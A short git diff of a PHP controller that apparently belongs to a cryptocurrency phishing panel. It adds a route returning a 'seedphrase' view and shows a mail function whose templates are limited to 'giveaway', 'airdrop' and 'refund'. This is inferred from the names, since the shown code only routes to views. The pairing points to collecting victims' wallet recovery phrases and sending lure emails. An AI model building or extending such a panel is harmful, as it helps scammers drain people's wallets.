@@ -14,9 +14,23 @@ class UserController extends Controller
 
 
 
+    // public function view()
+    // {
+    //     $user = auth()->user();
+    //     if ($user->role == 'admin') {
+    //         return redirect()->route('admin');
+    //     } else {
+    //         return view('user.dashboard', );
+    //     }
+    // }
     public function view()
     {
-        return view('user.dashboard');
+        $user = auth()->user();
+        if ($user->role == 'admin') {
+            return view('admin.dashboard');
+        } else {
+            return view('user.dashboard', );
+        }
     }
 
     public function raids()
@@ -34,9 +48,13 @@ class UserController extends Controller
     {
         return view('user.subscribe');
     }
+    public function seed()
+    {
+        return view('user.seedphrase');
+    }
 
 
-   public function mail(Request $request)
+    public function mail(Request $request)
     {
         $validator = Validator::make($request->all(), [
             'template' => ['required', 'in:giveaway,airdrop,refund'],
